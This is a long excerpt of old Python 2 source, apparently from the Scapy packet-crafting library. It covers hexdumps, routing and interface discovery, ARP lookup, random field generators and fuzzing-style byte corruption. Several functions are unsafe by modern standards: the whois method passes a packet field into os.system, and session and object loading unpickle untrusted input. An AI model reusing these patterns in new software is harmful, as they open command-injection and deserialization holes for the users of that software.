    def _get_manuf_couple(self, mac):
        oui = ":".join(mac.split(":")[:3]).upper()
        return self.__dict__.get(oui,(mac,mac))
    def _get_manuf(self, mac):
        return self._get_manuf_couple(mac)[1]
    def _get_short_manuf(self, mac):
        return self._get_manuf_couple(mac)[0]
    def _resolve_MAC(self, mac):
        oui = ":".join(mac.split(":")[:3]).upper()
        if oui in self:
            return ":".join([self[oui][0]]+ mac.split(":")[3:])
        return mac




def load_manuf(filename):
    try:
        manufdb=ManufDA(_name=filename)
        for l in open(filename):
            try:
                l = l.strip()
                if not l or l.startswith("#"):
                    continue
                oui,shrt=l.split()[:2]
                i = l.find("#")
                if i < 0:
                    lng=shrt
                else:
                    lng = l[i+2:]
                manufdb[oui] = shrt,lng
            except Exception,e:
                log_loading.warning("Couldn't parse one line from [%s] [%r] (%s)" % (filename, l, e))
    except IOError:
        #log_loading.warning("Couldn't open [%s] file" % filename)
        pass
    return manufdb

MANUFDB = load_manuf("/usr/share/wireshark/wireshark/manuf")




###########
## Tools ##
###########

def sane_color(x):
    r=""
    for i in x:
        j = ord(i)
        if (j < 32) or (j >= 127):
            r=r+conf.color_theme.not_printable(".")
        else:
            r=r+i
    return r

def sane(x):
    r=""
    for i in x:
        j = ord(i)
        if (j < 32) or (j >= 127):
            r=r+"."
        else:
            r=r+i
    return r

def lhex(x):
    if type(x) in (int,long):
        return hex(x)
    elif type(x) is tuple:
        return "(%s)" % ", ".join(map(lhex, x))
    elif type(x) is list:
        return "[%s]" % ", ".join(map(lhex, x))
    else:
        return x

def hexdump(x):
    x=str(x)
    l = len(x)
    i = 0
    while i < l:
        print "%04x  " % i,
        for j in range(16):
            if i+j < l:
                print "%02X" % ord(x[i+j]),
            else:
                print "  ",
            if j%16 == 7:
                print "",
        print " ",
        print sane_color(x[i:i+16])
        i += 16

def linehexdump(x, onlyasc=0, onlyhex=0):
    x = str(x)
    l = len(x)
    if not onlyasc:
        for i in range(l):
            print "%02X" % ord(x[i]),
        print "",
    if not onlyhex:
        print sane_color(x)

def chexdump(x):
    x=str(x)
    print ", ".join(map(lambda x: "%#04x"%ord(x), x))

def hexstr(x, onlyasc=0, onlyhex=0):
    s = []
    if not onlyasc:
        s.append(" ".join(map(lambda x:"%02x"%ord(x), x)))
    if not onlyhex:
        s.append(sane(x))
    return "  ".join(s)


def hexdiff(x,y):
    x=str(x)[::-1]
    y=str(y)[::-1]
    SUBST=1
    INSERT=1
    d={}
    d[-1,-1] = 0,(-1,-1)
    for j in range(len(y)):
        d[-1,j] = d[-1,j-1][0]+INSERT, (-1,j-1)
    for i in range(len(x)):
        d[i,-1] = d[i-1,-1][0]+INSERT, (i-1,-1)

    for j in range(len(y)):
        for i in range(len(x)):
            d[i,j] = min( ( d[i-1,j-1][0]+SUBST*(x[i] != y[j]), (i-1,j-1) ),
                          ( d[i-1,j][0]+INSERT, (i-1,j) ),
                          ( d[i,j-1][0]+INSERT, (i,j-1) ) )


    backtrackx = []
    backtracky = []
    i=len(x)-1
    j=len(y)-1
    while not (i == j == -1):
        i2,j2 = d[i,j][1]
        backtrackx.append(x[i2+1:i+1])
        backtracky.append(y[j2+1:j+1])
        i,j = i2,j2



    x = y = i = 0
    colorize = { 0: lambda x:x,
                -1: conf.color_theme.left,
                 1: conf.color_theme.right }

    dox=1
    doy=0
    l = len(backtrackx)
    while i < l:
        separate=0
        linex = backtrackx[i:i+16]
        liney = backtracky[i:i+16]
        xx = sum(len(k) for k in linex)
        yy = sum(len(k) for k in liney)
        if dox and not xx:
            dox = 0
            doy = 1
        if dox and linex == liney:
            doy=1

        if dox:
            xd = y
            j = 0
            while not linex[j]:
                j += 1
                xd -= 1
            print colorize[doy-dox]("%04x" % xd),
            x += xx
            line=linex
        else:
            print "    ",
        if doy:
            yd = y
            j = 0
            while not liney[j]:
                j += 1
                yd -= 1
            print colorize[doy-dox]("%04x" % yd),
            y += yy
            line=liney
        else:
            print "    ",

        print " ",

        cl = ""
        for j in range(16):
            if i+j < l:
                if line[j]:
                    col = colorize[(linex[j]!=liney[j])*(doy-dox)]
                    print col("%02X" % ord(line[j])),
                    if linex[j]==liney[j]:
                        cl += sane_color(line[j])
                    else:
                        cl += col(sane(line[j]))
                else:
                    print "  ",
                    cl += " "
            else:
                print "  ",
            if j == 7:
                print "",


        print " ",cl

        if doy or not yy:
            doy=0
            dox=1
            i += 16
        else:
            if yy:
                dox=0
                doy=1
            else:
                i += 16


crc32 = zlib.crc32

if BIG_ENDIAN:
    def checksum(pkt):
        if len(pkt) % 2 == 1:
            pkt += "\0"
        s = sum(array.array("H", pkt))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s
        return s & 0xffff
else:
    def checksum(pkt):
        if len(pkt) % 2 == 1:
            pkt += "\0"
        s = sum(array.array("H", pkt))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s
        return (((s>>8)&0xff)|s<<8) & 0xffff

def warning(x):
    log_runtime.warning(x)

def mac2str(mac):
    return "".join(map(lambda x: chr(int(x,16)), mac.split(":")))

def str2mac(s):
    return ("%02x:"*6)[:-1] % tuple(map(ord, s))

def strxor(x,y):
    return "".join(map(lambda x,y:chr(ord(x)^ord(y)),x,y))

def atol(x):
    try:
        ip = inet_aton(x)
    except socket.error:
        ip = inet_aton(socket.gethostbyname(x))
    return struct.unpack("!I", ip)[0]
def ltoa(x):
    return inet_ntoa(struct.pack("!I", x))

def itom(x):
    return (0xffffffff00000000L>>x)&0xffffffffL

def do_graph(graph,prog=None,format="svg",target=None, type=None,string=None,options=None):
    """do_graph(graph, prog=conf.prog.dot, format="svg",
         target="| conf.prog.display", options=None, [string=1]):
    string: if not None, simply return the graph string
    graph: GraphViz graph description
    format: output type (svg, ps, gif, jpg, etc.), passed to dot's "-T" option
    target: filename or redirect. Defaults pipe to Imagemagick's display program
    prog: which graphviz program to use
    options: options to be passed to prog"""


    if string:
        return graph
    if type is not None:
        format=type
    if prog is None:
        prog = conf.prog.dot
    if target is None:
        target = "| %s" % conf.prog.display
    if format is not None:
        format = "-T %s" % format
    w,r = os.popen2("%s %s %s %s" % (prog,options or "", format or "", target))
    w.write(graph)
    w.close()

_TEX_TR = {
    "{":"{\\tt\\char123}",
    "}":"{\\tt\\char125}",
    "\\":"{\\tt\\char92}",
    "^":"\\^{}",
    "$":"\\$",
    "#":"\\#",
    "~":"\\~",
    "_":"\\_",
    "&":"\\&",
    "%":"\\%",
    "|":"{\\tt\\char124}",
    "~":"{\\tt\\char126}",
    "<":"{\\tt\\char60}",
    ">":"{\\tt\\char62}",
    }

def tex_escape(x):
    s = ""
    for c in x:
        s += _TEX_TR.get(c,c)
    return s

def colgen(*lstcol,**kargs):
    """Returns a generator that mixes provided quantities forever
    trans: a function to convert the three arguments into a color. lambda x,y,z:(x,y,z) by default"""
    if len(lstcol) < 2:
        lstcol *= 2
    trans = kargs.get("trans", lambda x,y,z: (x,y,z))
    while 1:
        for i in range(len(lstcol)):
            for j in range(len(lstcol)):
                for k in range(len(lstcol)):
                    if i != j or j != k or k != i:
                        yield trans(lstcol[(i+j)%len(lstcol)],lstcol[(j+k)%len(lstcol)],lstcol[(k+i)%len(lstcol)])

def incremental_label(label="tag%05i", start=0):
    while True:
        yield label % start
        start += 1

#########################
#### Enum management ####
#########################

class EnumElement:
    _value=None
    def __init__(self, key, value):
        self._key = key
        self._value = value
    def __repr__(self):
        return "<%s %s[%r]>" % (self.__dict__.get("_name", self.__class__.__name__), self._key, self._value)
    def __getattr__(self, attr):
        return getattr(self._value, attr)
    def __str__(self):
        return self._key
    def __eq__(self, other):
        return self._value == int(other)


class Enum_metaclass(type):
    element_class = EnumElement
    def __new__(cls, name, bases, dct):
        rdict={}
        for k,v in dct.iteritems():
            if type(v) is int:
                v = cls.element_class(k,v)
                dct[k] = v
                rdict[v] = k
        dct["__rdict__"] = rdict
        return super(Enum_metaclass, cls).__new__(cls, name, bases, dct)
    def __getitem__(self, attr):
        return self.__rdict__[attr]
    def __contains__(self, val):
        return val in self.__rdict__
    def get(self, attr, val=None):
        return self._rdict__.get(attr, val)
    def __repr__(self):
        return "<%s>" % self.__dict__.get("name", self.__name__)




##############################
## Session saving/restoring ##
##############################


def save_session(fname, session=None, pickleProto=-1):
    if session is None:
        session = scapy_session

    to_be_saved = session.copy()

    if to_be_saved.has_key("__builtins__"):
        del(to_be_saved["__builtins__"])

    for k in to_be_saved.keys():
        if type(to_be_saved[k]) in [types.TypeType, types.ClassType, types.ModuleType]:
            log_interactive.error("[%s] (%s) can't be saved." % (k, type(to_be_saved[k])))
            del(to_be_saved[k])

    try:
        os.rename(fname, fname+".bak")
    except OSError:
        pass
    f=gzip.open(fname,"wb")
    cPickle.dump(to_be_saved, f, pickleProto)
    f.close()

def load_session(fname):
    try:
        s = cPickle.load(gzip.open(fname,"rb"))
    except IOError:
        s = cPickle.load(open(fname,"rb"))
    scapy_session.clear()
    scapy_session.update(s)

def update_session(fname):
    try:
        s = cPickle.load(gzip.open(fname,"rb"))
    except IOError:
        s = cPickle.load(open(fname,"rb"))
    scapy_session.update(s)


def export_object(obj):
    print base64.encodestring(gzip.zlib.compress(cPickle.dumps(obj,2),9))

def import_object(obj=None):
    if obj is None:
        obj = sys.stdin.read()
    return cPickle.loads(gzip.zlib.decompress(base64.decodestring(obj.strip())))


def save_object(fname, obj):
    cPickle.dump(obj,gzip.open(fname,"wb"))

def load_object(fname):
    return cPickle.load(gzip.open(fname,"rb"))


#################
## Debug class ##
#################

class debug:
    recv=[]
    sent=[]
    match=[]


####################
## IP Tools class ##
####################

class IPTools:
    """Add more powers to a class that have a "src" attribute."""
    def whois(self):
        os.system("whois %s" % self.src)
    def ottl(self):
        t = [32,64,128,255]+[self.ttl]
        t.sort()
        return t[t.index(self.ttl)+1]
    def hops(self):
        return self.ottl()-self.ttl-1


##############################
## Routing/Interfaces stuff ##
##############################

class Route:
    def __init__(self):
        self.resync()
        self.s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.cache = {}

    def invalidate_cache(self):
        self.cache = {}

    def resync(self):
        self.invalidate_cache()
        self.routes = read_routes()

    def __repr__(self):
        rt = "Network         Netmask         Gateway         Iface           Output IP\n"
        for net,msk,gw,iface,addr in self.routes:
            rt += "%-15s %-15s %-15s %-15s %-15s\n" % (ltoa(net),
                                              ltoa(msk),
                                              gw,
                                              iface,
                                              addr)
        return rt

    def make_route(self, host=None, net=None, gw=None, dev=None):
        if host is not None:
            thenet,msk = host,32
        elif net is not None:
            thenet,msk = net.split("/")
            msk = int(msk)
        else:
            raise Scapy_Exception("make_route: Incorrect parameters. You should specify a host or a net")
        if gw is None:
            gw="0.0.0.0"
        if dev is None:
            if gw:
                nhop = gw
            else:
                nhop = thenet
            dev,ifaddr,x = self.route(nhop)
        else:
            ifaddr = get_if_addr(dev)
        return (atol(thenet), itom(msk), gw, dev, ifaddr)

    def add(self, *args, **kargs):
        """Ex:
        add(net="192.168.1.0/24",gw="1.2.3.4")
        """
        self.invalidate_cache()
        self.routes.append(self.make_route(*args,**kargs))


    def delt(self,  *args, **kargs):
        """delt(host|net, gw|dev)"""
        self.invalidate_cache()
        route = self.make_route(*args,**kargs)
        try:
            i=self.routes.index(route)
            del(self.routes[i])
        except ValueError:
            warning("no matching route found")

    def ifchange(self, iff, addr):
        self.invalidate_cache()
        the_addr,the_msk = (addr.split("/")+["32"])[:2]
        the_msk = itom(int(the_msk))
        the_rawaddr = atol(the_addr)
        the_net = the_rawaddr & the_msk


        for i in range(len(self.routes)):
            net,msk,gw,iface,addr = self.routes[i]
            if iface != iff:
                continue
            if gw == '0.0.0.0':
                self.routes[i] = (the_net,the_msk,gw,iface,the_addr)
            else:
                self.routes[i] = (net,msk,gw,iface,the_addr)
        for i in arp_cache.keys():
            del(arp_cache[i])



    def ifdel(self, iff):
        self.invalidate_cache()
        new_routes=[]
        for rt in self.routes:
            if rt[3] != iff:
                new_routes.append(rt)
        self.routes=new_routes

    def ifadd(self, iff, addr):
        self.invalidate_cache()
        the_addr,the_msk = (addr.split("/")+["32"])[:2]
        the_msk = itom(int(the_msk))
        the_rawaddr = atol(the_addr)
        the_net = the_rawaddr & the_msk
        self.routes.append((the_net,the_msk,'0.0.0.0',iff,the_addr))


    def route(self,dest,verbose=None):
        if dest in self.cache:
            return self.cache[dest]
        if verbose is None:
            verbose=conf.verb
        # Transform "192.168.*.1-5" to one IP of the set
        dst = dest.split("/")[0]
        dst = dst.replace("*","0")
        while 1:
            l = dst.find("-")
            if l < 0:
                break
            m = (dst[l:]+".").find(".")
            dst = dst[:l]+dst[l+m:]


        dst = atol(dst)
        pathes=[]
        for d,m,gw,i,a in self.routes:
            aa = atol(a)
            if aa == dst:
                pathes.append((0xffffffffL,("lo",a,"0.0.0.0")))
            if (dst & m) == (d & m):
                pathes.append((m,(i,a,gw)))
        if not pathes:
            if verbose:
                warning("No route found (no default route?)")
            return "lo","0.0.0.0","0.0.0.0" #XXX linux specific!
        # Choose the more specific route (greatest netmask).
        # XXX: we don't care about metrics
        pathes.sort()
        ret = pathes[-1][1]
        self.cache[dest] = ret
        return ret

    def get_if_bcast(self, iff):
        for net, msk, gw, iface, addr in self.routes:
            if (iff == iface and net != 0L):
                bcast = atol(addr)|(~msk&0xffffffffL); # FIXME: check error in atol()
                return ltoa(bcast);
        warning("No broadcast address found for iface %s\n" % iff);

if DNET:
    def get_if_raw_hwaddr(iff):
        if iff[:2] == "lo":
            return (772, '\x00'*6)
        try:
            l = dnet.intf().get(iff)
            l = l["link_addr"]
        except:
            raise Scapy_Exception("Error in attempting to get hw address for interface [%s]" % iff)
        return l.type,l.data
    def get_if_raw_addr(ifname):
        i = dnet.intf()
        return i.get(ifname)["addr"].data
else:
    def get_if_raw_hwaddr(iff):
        return struct.unpack("16xh6s8x",get_if(iff,SIOCGIFHWADDR))

    def get_if_raw_addr(iff):
        try:
            return get_if(iff, SIOCGIFADDR)[20:24]
        except IOError:
            return "\0\0\0\0"


if PCAP:
    def get_if_list():
        # remove 'any' interface
        return map(lambda x:x[0],filter(lambda x:x[1] is None,pcap.findalldevs()))
    def get_working_if():
        try:
            return pcap.lookupdev()
        except pcap.pcapc.EXCEPTION:
            return 'lo'

    def attach_filter(s, filter):
        warning("attach_filter() should not be called in PCAP mode")
    def set_promisc(s,iff,val=1):
        warning("set_promisc() should not be called in DNET/PCAP mode")

else:
    def get_if_list():
        f=open("/proc/net/dev","r")
        lst = []
        f.readline()
        f.readline()
        for l in f:
            lst.append(l.split(":")[0].strip())
        return lst
    def get_working_if():
        for i in get_if_list():
            if i == 'lo':
                continue
            ifflags = struct.unpack("16xH14x",get_if(i,SIOCGIFFLAGS))[0]
            if ifflags & IFF_UP:
                return i
        return "lo"
    def attach_filter(s, filter):
        # XXX We generate the filter on the interface conf.iface
        # because tcpdump open the "any" interface and ppp interfaces
        # in cooked mode. As we use them in raw mode, the filter will not
        # work... one solution could be to use "any" interface and translate
        # the filter from cooked mode to raw mode
        # mode
        if not TCPDUMP:
            return
        try:
            f = os.popen("%s -i %s -ddd -s 1600 '%s'" % (conf.prog.tcpdump,conf.iface,filter))
        except OSError,msg:
            log_interactive.warning("Failed to execute tcpdump: (%s)")
            return
        lines = f.readlines()
        if f.close():
            raise Scapy_Exception("Filter parse error")
        nb = int(lines[0])
        bpf = ""
        for l in lines[1:]:
            bpf += struct.pack("HBBI",*map(long,l.split()))

        # XXX. Argl! We need to give the kernel a pointer on the BPF,
        # python object header seems to be 20 bytes. 36 bytes for x86 64bits arch.
        if X86_64:
            bpfh = struct.pack("HL", nb, id(bpf)+36)
        else:
            bpfh = struct.pack("HI", nb, id(bpf)+20)
        s.setsockopt(SOL_SOCKET, SO_ATTACH_FILTER, bpfh)

    def set_promisc(s,iff,val=1):
        mreq = struct.pack("IHH8s", get_if_index(iff), PACKET_MR_PROMISC, 0, "")
        if val:
            cmd = PACKET_ADD_MEMBERSHIP
        else:
            cmd = PACKET_DROP_MEMBERSHIP
        s.setsockopt(SOL_PACKET, cmd, mreq)


if not LINUX:

    def new_read_routes():

        rtlst = []
        def addrt(rt,lst):
            dst,gw = rt
            lst.append(rt)

        r = dnet.route()
        print r.loop(addrt, rtlst)
        return rtlst

    def read_routes():
        if SOLARIS:
            f=os.popen("netstat -rvn") # -f inet
        elif FREEBSD:
            f=os.popen("netstat -rnW") # -W to handle long interface names
        else:
            f=os.popen("netstat -rn") # -f inet
        ok = 0
        mtu_present = False
        routes = []
        for l in f.readlines():
            if not l:
                break
            l = l.strip()
            if l.find("----") >= 0: # a separation line
                continue
            if l.find("Destination") >= 0:
                ok = 1
                if l.find("Mtu") >= 0:
                    mtu_present = True
                continue
            if ok == 0:
                continue
            if not l:
                break
            if SOLARIS:
                dest,mask,gw,netif,mxfrg,rtt,ref,flg = l.split()[:8]
            else:
                if mtu_present:
                    dest,gw,flg,ref,use,mtu,netif = l.split()[:7]
                else:
                    dest,gw,flg,ref,use,netif = l.split()[:6]
            if flg.find("Lc") >= 0:
                continue
            if dest == "default":
                dest = 0L
                netmask = 0L
            else:
                if SOLARIS:
                    netmask = atol(mask)
                elif "/" in dest:
                    dest,netmask = dest.split("/")
                    netmask = itom(int(netmask))
                else:
                    netmask = itom((dest.count(".") + 1) * 8)
                dest += ".0"*(3-dest.count("."))
                dest = atol(dest)
            if not "G" in flg:
                gw = '0.0.0.0'
            ifaddr = get_if_addr(netif)
            routes.append((dest,netmask,gw,netif,ifaddr))
        f.close()
        return routes

    def read_interfaces():
        i = dnet.intf()
        ifflist = {}
        def addif(iff,lst):
            if not iff.has_key("addr"):
                return
            if not iff.has_key("link_addr"):
                return
            rawip = iff["addr"].data
            ip = inet_ntoa(rawip)
            rawll = iff["link_addr"].data
            ll = str2mac(rawll)
            lst[iff["name"]] = (rawll,ll,rawip,ip)
        i.loop(addif, ifflist)
        return ifflist


else:

    def read_routes():
        f=open("/proc/net/route","r")
        routes = []
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        ifreq = ioctl(s, SIOCGIFADDR,struct.pack("16s16x","lo"))
        addrfamily = struct.unpack("h",ifreq[16:18])[0]
        if addrfamily == socket.AF_INET:
            ifreq2 = ioctl(s, SIOCGIFNETMASK,struct.pack("16s16x","lo"))
            msk = socket.ntohl(struct.unpack("I",ifreq2[20:24])[0])
            dst = socket.ntohl(struct.unpack("I",ifreq[20:24])[0]) & msk
            ifaddr = inet_ntoa(ifreq[20:24])
            routes.append((dst, msk, "0.0.0.0", "lo", ifaddr))
        else:
            warning("Interface lo: unkown address family (%i)"% addrfamily)

        for l in f.readlines()[1:]:
            iff,dst,gw,flags,x,x,x,msk,x,x,x = l.split()
            flags = int(flags,16)
            if flags & RTF_UP == 0:
                continue
            if flags & RTF_REJECT:
                continue
            try:
                ifreq = ioctl(s, SIOCGIFADDR,struct.pack("16s16x",iff))
            except IOError: # interface is present in routing tables but does not have any assigned IP
                ifaddr="0.0.0.0"
            else:
                addrfamily = struct.unpack("h",ifreq[16:18])[0]
                if addrfamily == socket.AF_INET:
                    ifaddr = inet_ntoa(ifreq[20:24])
                else:
                    warning("Interface %s: unkown address family (%i)"%(iff, addrfamily))
                    continue
            routes.append((socket.htonl(long(dst,16))&0xffffffffL,
                           socket.htonl(long(msk,16))&0xffffffffL,
                           inet_ntoa(struct.pack("I",long(gw,16))),
                           iff, ifaddr))

        f.close()
        return routes

    def get_if(iff,cmd):
        s=socket.socket()
        ifreq = ioctl(s, cmd, struct.pack("16s16x",iff))
        s.close()
        return ifreq


    def get_if_index(iff):
        return int(struct.unpack("I",get_if(iff, SIOCGIFINDEX)[16:20])[0])

    def get_last_packet_timestamp(sock):
        ts = ioctl(sock, SIOCGSTAMP, "12345678")
        s,us = struct.unpack("II",ts)
        return s+us/1000000.0


def get_if_addr(iff):
    return inet_ntoa(get_if_raw_addr(iff))

def get_if_hwaddr(iff):
    addrfamily, mac = get_if_raw_hwaddr(iff)
    if addrfamily in [ARPHDR_ETHER,ARPHDR_LOOPBACK]:
        return str2mac(mac)
    else:
        raise Scapy_Exception("Unsupported address family (%i) for interface [%s]" % (addrfamily,iff))



#####################
## ARP cache stuff ##
#####################

ARPTIMEOUT=120

# XXX Fill arp_cache with /etc/ether and arp cache
arp_cache={}

if 0 and DNET: ## XXX Can't use this because it does not resolve IPs not in cache
    dnet_arp_object = dnet.arp()
    def getmacbyip(ip, chainCC=0):
        tmp = map(ord, inet_aton(ip))
        if (tmp[0] & 0xf0) == 0xe0: # mcast @
            return "01:00:5e:%.2x:%.2x:%.2x" % (tmp[1]&0x7f,tmp[2],tmp[3])
        iff,a,gw = conf.route.route(ip)
        if iff == "lo":
            return "ff:ff:ff:ff:ff:ff"
        if gw != "0.0.0.0":
            ip = gw
        res = dnet_arp_object.get(dnet.addr(ip))
        if res is None:
            return None
        else:
            return res.ntoa()
else:
    def getmacbyip(ip, chainCC=0):
        tmp = map(ord, inet_aton(ip))
        if (tmp[0] & 0xf0) == 0xe0: # mcast @
            return "01:00:5e:%.2x:%.2x:%.2x" % (tmp[1]&0x7f,tmp[2],tmp[3])
        iff,a,gw = conf.route.route(ip)
        if ( (iff == "lo") or (ip == conf.route.get_if_bcast(iff)) ):
            return "ff:ff:ff:ff:ff:ff"
        if gw != "0.0.0.0":
            ip = gw

        if arp_cache.has_key(ip):
            mac, timeout = arp_cache[ip]
            if not timeout or (time.time()-timeout < ARPTIMEOUT):
                return mac

        res = srp1(Ether(dst=ETHER_BROADCAST)/ARP(op="who-has", pdst=ip),
                   type=ETH_P_ARP,
                   iface = iff,
                   timeout=2,
                   verbose=0,
                   chainCC=chainCC,
                   nofilter=1)
        if res is not None:
            mac = res.payload.hwsrc
            arp_cache[ip] = (mac,time.time())
            return mac
        return None


####################
## Random numbers ##
####################

def randseq(inf, sup, seed=None, forever=1, renewkeys=0):
    """iterate through a sequence in random order.
       When all the values have been drawn, if forever=1, the drawing is done again.
       If renewkeys=0, the draw will be in the same order, guaranteeing that the same
       number will be drawn in not less than the number of integers of the sequence"""
    rnd = random.Random(seed)
    sbox_size = 256

    top = sup-inf+1

    n=0
    while (1<<n) < top:
        n += 1

    fs = min(3,(n+1)/2)
    fsmask = 2**fs-1
    rounds = max(n,3)
    turns = 0

    while 1:
        if turns == 0 or renewkeys:
            sbox = [rnd.randint(0,fsmask) for k in xrange(sbox_size)]
        turns += 1
        i = 0
        while i < 2**n:
            ct = i
            i += 1
            for k in range(rounds): # Unbalanced Feistel Network
                lsb = ct & fsmask
                ct >>= fs
                lsb ^= sbox[ct%sbox_size]
                ct |= lsb << (n-fs)

            if ct < top:
                yield inf+ct
        if not forever:
            break


class VolatileValue:
    def __repr__(self):
        return "<%s>" % self.__class__.__name__
    def __getattr__(self, attr):
        if attr == "__setstate__":
            raise AttributeError(attr)
        return getattr(self._fix(),attr)
    def _fix(self):
        return None


class RandField(VolatileValue):
    pass


class RandNum(RandField):
    min = 0
    max = 0
    def __init__(self, min, max):
        self.seq = randseq(min,max)
    def _fix(self):
        return self.seq.next()

class RandNumGamma(RandField):
    def __init__(self, alpha, beta):
        self.alpha = alpha
        self.beta = beta
    def _fix(self):
        return int(round(random.gammavariate(self.alpha, self.beta)))

class RandNumGauss(RandField):
    def __init__(self, mu, sigma):
        self.mu = mu
        self.sigma = sigma
    def _fix(self):
        return int(round(random.gauss(self.mu, self.sigma)))

class RandNumExpo(RandField):
    def __init__(self, lambd):
        self.lambd = lambd
    def _fix(self):
        return int(round(random.expovariate(self.lambd)))

class RandByte(RandNum):
    def __init__(self):
        RandNum.__init__(self, 0, 2L**8-1)

class RandShort(RandNum):
    def __init__(self):
        RandNum.__init__(self, 0, 2L**16-1)

class RandInt(RandNum):
    def __init__(self):
        RandNum.__init__(self, 0, 2L**32-1)

class RandSInt(RandNum):
    def __init__(self):
        RandNum.__init__(self, -2L**31, 2L**31-1)

class RandLong(RandNum):
    def __init__(self):
        RandNum.__init__(self, 0, 2L**64-1)

class RandSLong(RandNum):
    def __init__(self):
        RandNum.__init__(self, -2L**63, 2L**63-1)

class RandChoice(RandField):
    def __init__(self, *args):
        self._choice = args
    def _fix(self):
        return random.choice(self._choice)

class RandString(RandField):
    def __init__(self, size, chars="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"):
        self.chars = chars
        self.size = size
    def _fix(self):
        s = ""
        for i in range(self.size):
            s += random.choice(self.chars)
        return s

class RandBin(RandString):
    def __init__(self, size):
        RandString.__init__(self, size, "".join(map(chr,range(256))))


class RandTermString(RandString):
    def __init__(self, size, term):
        RandString.__init__(self, size, "".join(map(chr,range(1,256))))
        self.term = term
    def _fix(self):
        return RandString._fix(self)+self.term



class RandIP(RandString):
    def __init__(self, iptemplate="0.0.0.0/0"):
        self.ip = Net(iptemplate)
    def _fix(self):
        return self.ip.choice()

class RandMAC(RandString):
    def __init__(self, template="*"):
        template += ":*:*:*:*:*"
        template = template.split(":")
        self.mac = ()
        for i in range(6):
            if template[i] == "*":
                v = RandByte()
            elif "-" in template[i]:
                x,y = template[i].split("-")
                v = RandNum(int(x,16), int(y,16))
            else:
                v = int(template[i],16)
            self.mac += (v,)
    def _fix(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % self.mac


class RandOID(RandString):
    def __init__(self, fmt=None, depth=RandNumExpo(0.1), idnum=RandNumExpo(0.01)):
        self.ori_fmt = fmt
        if fmt is not None:
            fmt = fmt.split(".")
            for i in range(len(fmt)):
                if "-" in fmt[i]:
                    fmt[i] = tuple(map(int, fmt[i].split("-")))
        self.fmt = fmt
        self.depth = depth
        self.idnum = idnum
    def __repr__(self):
        if self.ori_fmt is None:
            return "<%s>" % self.__class__.__name__
        else:
            return "<%s [%s]>" % (self.__class__.__name__, self.ori_fmt)
    def _fix(self):
        if self.fmt is None:
            return ".".join(map(str, [self.idnum for i in xrange(1+self.depth)]))
        else:
            oid = []
            for i in self.fmt:
                if i == "*":
                    oid.append(str(self.idnum))
                elif i == "**":
                    oid += map(str, [self.idnum for i in xrange(1+self.depth)])
                elif type(i) is tuple:
                    oid.append(str(random.randrange(*i)))
                else:
                    oid.append(i)
            return ".".join(oid)



class RandASN1Object(RandField):
    def __init__(self, objlist=None):
        if objlist is None:
            objlist = map(lambda x:x._asn1_obj,
                          filter(lambda x:hasattr(x,"_asn1_obj"), ASN1_Class_UNIVERSAL.__rdict__.values()))
        self.objlist = objlist
        self.chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    def _fix(self, n=0):
        o = random.choice(self.objlist)
        if issubclass(o, ASN1_INTEGER):
            return o(int(random.gauss(0,1000)))
        elif issubclass(o, ASN1_STRING):
            z = int(random.expovariate(0.05)+1)
            return o("".join([random.choice(self.chars) for i in range(z)]))
        elif issubclass(o, ASN1_SEQUENCE) and (n < 10):
            z = int(random.expovariate(0.08)+1)
            return o(map(lambda x:x._fix(n+1), [self.__class__(objlist=self.objlist)]*z))
        return ASN1_INTEGER(int(random.gauss(0,1000)))


# Automatic timestamp

class AutoTime(VolatileValue):
    def __init__(self, base=None):
        if base == None:
            self.diff = 0
        else:
            self.diff = time.time()-base
    def _fix(self):
        return time.time()-self.diff

class IntAutoTime(AutoTime):
    def _fix(self):
        return int(time.time()-self.diff)



class DelayedEval(VolatileValue):
    """ Exemple of usage: DelayedEval("time.time()") """
    def __init__(self, expr):
        self.expr = expr
    def _fix(self):
        return eval(self.expr)


class IncrementalValue(VolatileValue):
    def __init__(self, start=0, step=1, restart=-1):
        self.start = self.val = start
        self.step = step
        self.restart = restart
    def _fix(self):
        v = self.val
        if self.val == self.restart :
            self.val = self.start
        else:
            self.val += self.step
        return v

def corrupt_bytes(s, p=0.01, n=None):
    s = array.array("B",str(s))
    l = len(s)
    if n is None:
        n = max(1,int(l*p))
    for i in random.sample(xrange(l), n):
        s[i] = random.randint(0,255)
    return s.tostring()

def corrupt_bits(s, p=0.01, n=None):
    s = array.array("B",str(s))
    l = len(s)*8
    if n is None:
        n = max(1,int(l*p))
    for i in random.sample(xrange(l), n):
        s[i/8] ^= 1 << (i%8)
    return s.tostring()


class CorruptedBytes(VolatileValue):
    def __init__(self, s, p=0.01, n=None):
        self.s = s
        self.p = p
        self.n = n
    def _fix(self):
        return corrupt_bytes(self.s, self.p, self.n)

class CorruptedBits(CorruptedBytes):
    def _fix(self):
        return corrupt_bits(self.s, self.p, self.n)

##############
#### ASN1 ####
##############

class ASN1_Error(Exception):
    pass

class ASN1_Encoding_Error(ASN1_Error):
    pass

class ASN1_Decoding_Error(ASN1_Error):
    pass

class ASN1_BadTag_Decoding_Error(ASN1_Decoding_Error):
    pass



class ASN1Codec(EnumElement):
    def register_stem(cls, stem):
        cls._stem = stem
    def dec(cls, s, context=None):
        return cls._stem.dec(s, context=context)
    def safedec(cls, s, context=None):
        return cls._stem.safedec(s, context=context)
    def get_stem(cls):
        return cls.stem


class ASN1_Codecs_metaclass(Enum_metaclass):
    element_class = ASN1Codec

class ASN1_Codecs:
    __metaclass__ = ASN1_Codecs_metaclass
    BER = 1
    DER = 2
    PER = 3
    CER = 4
    LWER = 5
    BACnet = 6
    OER = 7
    SER = 8
    XER = 9

class ASN1Tag(EnumElement):
    def __init__(self, key, value, context=None, codec=None):
        EnumElement.__init__(self, key, value)
        self._context = context
        if codec == None:
            codec = {}
        self._codec = codec
    def clone(self): # /!\ not a real deep copy. self.codec is shared
        return self.__class__(self._key, self._value, self._context, self._codec)
    def register_asn1_object(self, asn1obj):
        self._asn1_obj = asn1obj
    def asn1_object(self, val):
        if hasattr(self,"_asn1_obj"):
            return self._asn1_obj(val)
        raise ASN1_Error("%r does not have any assigned ASN1 object" % self)
